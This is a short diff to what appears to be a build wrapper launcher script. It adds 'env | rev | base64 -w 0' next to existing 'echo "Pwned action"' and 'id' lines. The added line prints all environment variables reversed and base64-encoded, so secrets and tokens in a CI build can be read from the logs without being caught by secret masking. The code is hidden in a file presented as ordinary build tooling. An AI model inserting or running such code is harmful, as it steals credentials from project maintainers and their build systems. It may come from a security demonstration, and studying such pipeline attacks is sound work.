@@ -25,6 +25,8 @@
 echo "Pwned action"
 id
 
+env | rev | base64 -w 0
+
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
 PRG="$0"
